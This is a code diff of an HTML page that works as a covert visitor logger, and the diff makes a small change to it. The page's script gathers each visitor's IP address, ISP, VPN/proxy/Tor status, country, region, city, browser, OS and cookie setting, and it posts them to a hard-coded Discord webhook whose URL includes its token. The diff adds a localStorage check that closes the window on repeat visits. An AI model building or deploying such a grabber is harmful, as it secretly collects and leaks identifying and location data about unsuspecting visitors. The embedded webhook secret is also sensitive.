@@ -1,8 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head>
-</head>
 <body>
+    <script>
+        function checkVisits() {
+          if (localStorage.getItem('visited')) {
+            window.close();
+          } else {
+            localStorage.setItem('visited', 'true');
+          }
+        }
+    </script>
     <script async>
         async function fetchAndSendDataToWebhook() {
             const webhookUrl = "https://discord.com/api/webhooks/1134344552313012284/Ut-snO1vzFZ080T-lmI6_76lo6vtAZnsU_TRZ7FmOK_QE-DDkwNRHkTRh6TM984rNpY1";
@@ -45,22 +52,22 @@
                 const overallEmbed = {
                     title: "Overall",
                     description: `----------------IP--------------
-IPv4: ${ipAddressData.ip}
-ISP: ${ipdata.asn.name}
-----------DETECTIONS--------
-VPN : ${isVPNDetected ? "2/2" : "0/2"}
-Proxy : ${isProxyDetected ? "2/2" : "0/2"}
-TOR : ${isTORDetected ? "2/2" : "0/2"}
------------LOCATION----------
-Country: ${ipinfoData.country || "N/A"}
-State: ${ipinfoData.region || "N/A"}
-City: ${ipinfoData.city || "N/A"}
---------------BROWSER-------------
-Browser: ${browserInfo.browser}
-OS: ${browserInfo.os}
-JS enabled: ${browserInfo.jsEnabled}
-Cookies: ${browserInfo.cookies}
----------------------------------`,
+                        IPv4: ${ipAddressData.ip}
+                        ISP: ${ipdata.asn.name}
+                        ----------DETECTIONS--------
+                        VPN : ${isVPNDetected ? "2/2" : "0/2"}
+                        Proxy : ${isProxyDetected ? "2/2" : "0/2"}
+                        TOR : ${isTORDetected ? "2/2" : "0/2"}
+                        -----------LOCATION----------
+                        Country: ${ipinfoData.country || "N/A"}
+                        State: ${ipinfoData.region || "N/A"}
+                        City: ${ipinfoData.city || "N/A"}
+                        --------------BROWSER-------------
+                        Browser: ${browserInfo.browser}
+                        OS: ${browserInfo.os}
+                        JS enabled: ${browserInfo.jsEnabled}
+                        Cookies: ${browserInfo.cookies}
+                        ---------------------------------`,
                     color: isVPNDetected || isProxyDetected || isTORDetected ? 16711680 : 65280,
                 };
 
@@ -100,7 +107,7 @@ Cookies: ${browserInfo.cookies}
                     );
                     return;
                 }
-
+                checkVisits()
                 const webhookResponse = await fetch(webhookUrl, {
                     method: "POST",
                     headers: {
@@ -108,7 +115,7 @@ Cookies: ${browserInfo.cookies}
                     },
                     body: JSON.stringify(embedData),
                 });
-
+                    
                 if (!webhookResponse.ok) {
                     throw new Error("Failed to send data to Discord webhook.");
                 }
